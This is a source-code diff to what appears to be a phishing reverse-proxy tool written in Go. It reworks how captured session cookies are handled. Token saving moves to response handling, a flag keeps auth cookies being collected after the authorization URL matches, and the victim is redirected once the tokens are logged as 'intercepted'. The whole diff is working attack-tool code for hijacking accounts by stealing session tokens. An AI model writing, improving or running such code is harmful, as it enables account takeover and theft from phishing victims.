@@ -297,25 +297,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 				req.Header.Set(string(e), e_host)
 
-				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
-					s, ok := p.sessions[ps.SessionId]
-					if ok && !s.IsDone {
-						for _, au := range pl.authUrls {
-							if au.MatchString(req.URL.Path) {
-								err := p.db.SetSessionTokens(ps.SessionId, s.Tokens)
-								if err != nil {
-									log.Error("database: %v", err)
-								}
-								s.IsDone = true
-								if err == nil {
-									log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, req.URL.Path)
-								}
-								break
-							}
-						}
-					}
-				}
-
 				if ps.SessionId != "" && origin == "" {
 					s, ok := p.sessions[ps.SessionId]
 					if ok {
@@ -325,6 +306,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if resp != nil {
 								resp.Header.Add("Location", s.RedirectURL)
 								return req, resp
+							}
+						}
+					}
+				}
+
+				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
+					s, ok := p.sessions[ps.SessionId]
+					if ok && !s.IsDone {
+						for _, au := range pl.authUrls {
+							if au.MatchString(req.URL.Path) {
+								s.IsDone = true
+								s.IsAuthUrl = true
+								break
 							}
 						}
 					}
@@ -397,7 +391,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
 					if pl.isAuthToken(c_domain, ck.Name) {
 						s, ok := p.sessions[ps.SessionId]
-						if ok && !s.IsDone {
+						if ok && (s.IsAuthUrl || !s.IsDone) {
 							if ck.Value != "" { // cookies with empty values are of no interest to us
 								is_auth = s.AddAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, auth_tokens)
 								if len(pl.authUrls) > 0 {
@@ -467,6 +461,32 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 							}
+						}
+					}
+				}
+			}
+
+			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
+				s, ok := p.sessions[ps.SessionId]
+				if ok && s.IsDone {
+					for _, au := range pl.authUrls {
+						if au.MatchString(resp.Request.URL.Path) {
+							err := p.db.SetSessionTokens(ps.SessionId, s.Tokens)
+							if err != nil {
+								log.Error("database: %v", err)
+							}
+							if err == nil {
+								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+							}
+							if s.IsDone && s.RedirectURL != "" {
+								log.Important("[%d] redirecting to URL: %s", ps.Index, s.RedirectURL)
+								resp := goproxy.NewResponse(resp.Request, "text/html", http.StatusFound, "")
+								if resp != nil {
+									resp.Header.Add("Location", s.RedirectURL)
+									return resp
+								}
+							}
+							break
 						}
 					}
 				}
